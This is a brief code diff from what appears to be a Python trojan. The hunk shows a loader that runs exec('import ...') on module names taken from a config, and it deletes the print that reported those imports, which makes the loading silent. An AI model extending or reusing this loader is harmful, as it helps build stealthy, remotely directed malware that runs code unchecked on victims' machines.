@@ -32,7 +32,6 @@ class Trojan:
         
         for task in config:
             if task['module'] not in sys.modules:
-                print("import %s" % task['module'])
                 exec("import %s" % task['module'])
         return config
     
